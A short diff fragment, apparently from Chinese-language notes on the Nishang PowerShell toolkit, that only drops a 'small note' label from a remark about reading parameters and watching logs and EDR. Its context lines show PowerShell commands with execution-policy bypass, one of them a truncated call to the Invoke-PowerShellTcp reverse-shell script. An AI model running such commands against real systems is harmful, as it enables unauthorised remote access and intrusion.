@@ -30,4 +30,4 @@ powershell -ExecutionPolicy Bypass -Command ". .\\Invoke-PowerShellTcp.ps1; Invo
 powershell -ExecutionPolicy Bypass -Command ". .\\Invoke-Encode.ps1; Invoke-Encode -DataToEncode 'whoami' -IsString"
 ```
 
-小记录：Nishang 脚本差异很大，执行前先读参数。比赛环境里常用来快速验证思路，企业环境里要注意日志和 EDR 响应。
+Nishang 脚本差异很大，执行前先读参数。比赛环境里常用来快速验证思路，企业环境里要注意日志和 EDR 响应。
